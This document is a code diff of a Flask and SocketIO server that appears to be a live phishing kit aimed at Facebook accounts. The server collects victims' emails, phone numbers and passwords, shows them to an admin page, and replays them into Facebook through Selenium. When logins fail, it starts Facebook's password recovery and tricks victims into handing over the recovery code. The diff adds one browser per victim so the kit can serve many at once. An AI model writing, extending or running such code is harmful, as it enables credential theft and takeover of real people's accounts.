@@ -8,10 +8,13 @@ from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import time
+from selenium.webdriver.chrome.options import Options
+import uuid
 
 app = Flask(__name__)
 socketio = SocketIO(app)
-driver = None
+ 
+drivers = {}
 
 # Dictionary to track login attempts
 login_attempts = {}
@@ -21,6 +24,7 @@ code_attempts = {}
 def index():
     return render_template('index.html')
 
+
 @app.route('/admin')
 def admin():
     return render_template('admin.html')
@@ -28,13 +32,15 @@ def admin():
 @app.route('/confirm')
 def confirm_page():
     return render_template('confirm.html')
+    
 @app.route('/done')
 def done_page():
     return render_template('done.html')
+
 @socketio.on('connect')
 def handle_connect():
     print(f'Client connected: {request.sid}')
-    emit('message', {'data': f'Connected to the server with ID: {request.sid}'})
+    emit('message', {'data': f'Connected to the server with user ID: {request.sid}'})
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -62,33 +68,39 @@ def handle_client_password(data):
     emit('admin_message', {'id': request.sid, 'type': 'password', 'data': password}, broadcast=True)
     
     # Perform login test with the received contact and password
-    result = login_facebook(email, phone, password)
+    result = login_facebook(request.sid, email, phone, password)
     
     # Track login attempts
     if request.sid not in login_attempts:
         login_attempts[request.sid] = 0
     if result == "Wrong_Pass":
         login_attempts[request.sid] += 1
-        if login_attempts[request.sid] > 2:
-            forgot_password(email,phone)
+        if login_attempts[request.sid] >= 2:
+            forgot_password(request.sid, email, phone)
             emit('redirect', {'url': '/confirm'}, room=request.sid)
             return
     
     # Emit the result back to the client
     emit('login_result', {'result': result}, room=request.sid)
 
-def setup_selenium():
-    global driver
-    if driver is None:
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service)
-        driver.get("https://www.facebook.com/")
-    return driver
+def setup_selenium(session_id):
+    if session_id in drivers and drivers[session_id] is not None:
+        return drivers[session_id]
+    
+    chrome_options = Options()
+ 
+    chrome_options.add_argument("--enable-unsafe-swiftshader")  
 
-def login_facebook(email, phone, password):
-    global driver
+    service = Service(ChromeDriverManager().install())
+    driver = webdriver.Chrome(service=service, options=chrome_options)
+    driver.get("https://www.facebook.com/")
+    drivers[session_id] = driver
+    return drivers[session_id]
+
+def login_facebook(session_id, email, phone, password):
+    driver = setup_selenium(session_id)
     try:
-        driver = setup_selenium()
+       
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "email")))
         
         contact = email if email else phone
@@ -130,7 +142,7 @@ def login_facebook(email, phone, password):
                 print("Login failed. Please check your credentials.")
                 return "Wrong_Pass"
         elif "https://www.facebook.com/recover" in driver.current_url:
-            forgot_password(email,phone)
+            forgot_password(session_id, email, phone)
             emit('redirect', {'url': '/confirm'}, room=request.sid)
 
         print("Login successful.")
@@ -140,8 +152,8 @@ def login_facebook(email, phone, password):
         return str(e)
 
 
-def forgot_password(email, mobile=None):
-    global driver
+def forgot_password(session_id, email, mobile=None):
+    driver = setup_selenium(session_id)
     try:
         driver.get("https://www.facebook.com/login/identify")
  
@@ -169,32 +181,29 @@ def forgot_password(email, mobile=None):
     except Exception as e:
         print(f"An error occurred during forgot password process: {e}")
 
-
 @socketio.on('confirm_code')
 def handle_confirm_code(data):
     code = data['code']
     print(f'Received confirmation code from client {request.sid}: {code}')
     
-    # Track confirmation code attempts
     if request.sid not in code_attempts:
         code_attempts[request.sid] = 0
     code_attempts[request.sid] += 1
-    print(code_attempts[request.sid])
+    
     if code_attempts[request.sid] > 2:
         emit('redirect', {'url': '/done'}, room=request.sid)
         return
     
-    result = enter_confirmation_code(code)
-    print(result)
+    result = enter_confirmation_code(request.sid, code)
     if result != "Code_Accepted":
         code_attempts[request.sid] += 1
         if code_attempts[request.sid] >= 2:
             emit('redirect', {'url': '/done'}, room=request.sid)
-            return
+ 
 
 
-def enter_confirmation_code(code):
-    global driver
+def enter_confirmation_code(session_id, code):
+    driver = setup_selenium(session_id)
     try:
         code_input = WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.ID, "recovery_code_entry"))
@@ -212,8 +221,8 @@ def enter_confirmation_code(code):
             print("Invalid confirmation code. Please try again.")
             return "Invalid_Code"
 
-
         print("Confirmation code entered.")
+        return "Code_Accepted"
     except Exception as e:
         print(f"An error occurred while entering the confirmation code: {e}")
 
